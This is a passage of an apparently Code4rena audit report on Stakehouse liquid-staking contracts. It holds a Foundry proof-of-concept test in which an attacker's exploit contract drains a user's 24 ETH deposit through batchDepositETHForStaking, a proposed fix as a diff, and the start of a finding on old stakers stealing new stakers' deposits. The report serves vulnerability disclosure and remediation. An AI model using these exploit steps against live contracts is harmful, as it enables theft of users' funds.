class=\"mtk8\">&quot;attacker&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// User deposits ETH into Giant savETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">savETHUser</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">giantSavETHPool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositETH</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span><span class=\"mtk7\">24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">giantSavETHPool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lpTokenETH</span><span class=\"mtk1\">().</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">savETHUser</span><span class=\"mtk1\">), </span><span class=\"mtk7\">24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">giantSavETHPool</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Attacker deploys an exploit.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">GiantPoolExploit</span><span class=\"mtk1\"> </span><span class=\"mtk12\">exploit</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">GiantPoolExploit</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">manager</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Attacker calls `batchDepositETHForStaking` to deposit ETH to their exploit contract.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[][] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">blsKeysForVaults</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[][](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">blsKeysForVaults</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">getBytesArrayFromBytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[][] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakeAmountsForVaults</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[][](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">stakeAmountsForVaults</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">getUint256ArrayFromValues</span><span class=\"mtk1\">(</span><span class=\"mtk7\">24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">giantSavETHPool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">batchDepositETHForStaking</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">getAddressArrayFromValues</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">exploit</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">getUint256ArrayFromValues</span><span class=\"mtk1\">(</span><span class=\"mtk7\">24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">blsKeysForVaults</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">stakeAmountsForVaults</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Vault got nothing.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">savETHVault</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Attacker has stolen user&#39;s deposit.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">25</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider taking a list of <code>LiquidStakingManager</code> addresses instead of vault addresses:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/liquid-staking/GiantSavETHVaultPool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/liquid-staking/GiantSavETHVaultPool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -27,12 +28,12 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @param _blsPublicKeys For every savETH vault, the list of BLS keys of LSDN validators receiving funding</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @param _stakeAmounts For every savETH vault, the amount of ETH each BLS key will receive in funding</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function batchDepositETHForStaking(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        address[] calldata _savETHVaults,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address[] calldata _liquidStakingManagers,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256[] calldata _ETHTransactionAmounts,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         bytes[][] calldata _blsPublicKeys,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256[][] calldata _stakeAmounts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) public {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 numOfSavETHVaults = _savETHVaults.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 numOfSavETHVaults = _liquidStakingManagers.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(numOfSavETHVaults &gt; 0, &quot;Empty arrays&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(numOfSavETHVaults == _ETHTransactionAmounts.length, &quot;Inconsistent array lengths&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(numOfSavETHVaults == _blsPublicKeys.length, &quot;Inconsistent array lengths&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -40,16 +41,18 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // For every vault specified, supply ETH for at least 1 BLS public key of a LSDN validator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i; i &lt; numOfSavETHVaults; ++i) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            require(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                liquidStakingDerivativeFactory.isLiquidStakingManager(_liquidStakingManagers[i]),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                &quot;Invalid liquid staking manager&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             uint256 transactionAmount = _ETHTransactionAmounts[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // As ETH is being deployed to a savETH pool vault, it is no longer idle</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             idleETH -= transactionAmount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            SavETHVault savETHPool = SavETHVault(_savETHVaults[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            require(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                &quot;Invalid liquid staking manager&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            LiquidStakingManager liquidStakingManager = LiquidStakingManager(payable(_liquidStakingManagers[i]));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            SavETHVault savETHPool = liquidStakingManager.savETHVault();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // Deposit ETH for staking of BLS key</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             savETHPool.batchDepositETHForStaking{ value: transactionAmount }(</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/251#issuecomment-1329428177\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-18-old-stakers-can-steal-deposits-of-new-stakers-in-stakingfundsvault\" style=\"position:relative;\"><a href=\"#h-18-old-stakers-can-steal-deposits-of-new-stakers-in-stakingfundsvault\" aria-label=\"h 18 old stakers can steal deposits of new stakers in stakingfundsvault permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/255\">[H-18] Old stakers can steal deposits of new stakers in <code>StakingFundsVault</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/255\">Jeiwan</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/387\">immeas</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/375\">rbserver</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/246\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/227\">cccz</a>, and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/114\">9svR6w</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L75\">https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L75</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L123\">https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L123</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L63\">https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L63</a></p>\n<p>Stakers to the MEV+fees vault can steal funds from the new stakers who staked after a validator was registered and the derivatives were minted. A single staker who staked 4 ETH can steal all funds deposited by new stakers.</p>\n<h3 id=\"proof-of-concept-16\" style=\"position:relative;\"><a href=\"#proof-of-concept-16\" aria-label=\"proof of concept 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>StakingFundsVault</code> is designed to pull rewards from a Syndicate contract and distributed them pro-rata among LP token holders (<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L215-L231\">StakingFundsVault.sol#L215-L231</a>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">i</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; !</span><span class=\"mtk11\">Syndicate</span><span class=\"mtk1\">(</span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">liquidStakingNetworkManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">syndicate</span><span class=\"mtk1\">())).</span><span class=\"mtk11\">isNoLongerPartOfSyndicate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_blsPubKeys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">])) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Withdraw any ETH accrued on free floating SLOT from syndicate to this contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_claimFundsFromSyndicateForDistribution</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">liquidStakingNetworkManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">syndicate</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_blsPubKeys</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Distribute ETH per LP</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">updateAccumulatedETHPerLP</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// If msg.sender has a balance for the LP token associated with the BLS key, then send them any accrued ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">LPToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">lpTokenForKnot</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_blsPubKeys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Invalid BLS key&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lastInteractedTimestamp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">) + </span><span class=\"mtk7\">30</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minutes</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Last transfer too recent&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_distributeETHRewardsToUserForToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">), </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The <code>updateAccumulatedETHPerLP</code> function calculates the reward amount per LP token share (<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L76\">SyndicateRewardsProcessor.sol#L76</a>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_updateAccumulatedETHPerLP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_numOfShares</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_numOfShares</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">received</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">totalRewardsReceived</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">unprocessed</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">received</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">totalETHSeen</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">unprocessed</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ETHReceived</span><span class=\"mtk1\">(</span><span class=\"mtk12\">unprocessed</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// accumulated ETH per minted share is scaled to avoid precision loss. it is scaled down later</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">accumulatedETHPerLPShare</span><span class=\"mtk1\"> += (</span><span class=\"mtk12\">unprocessed</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">PRECISION</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">_numOfShares</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">totalETHSeen</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">received</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>And the <code>_distributeETHRewardsToUserForToken</code> function distributes rewards to LP token holders (<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51\">SyndicateRewardsProcessor.sol#L51</a>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_distributeETHRewardsToUserForToken</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_user</span><span 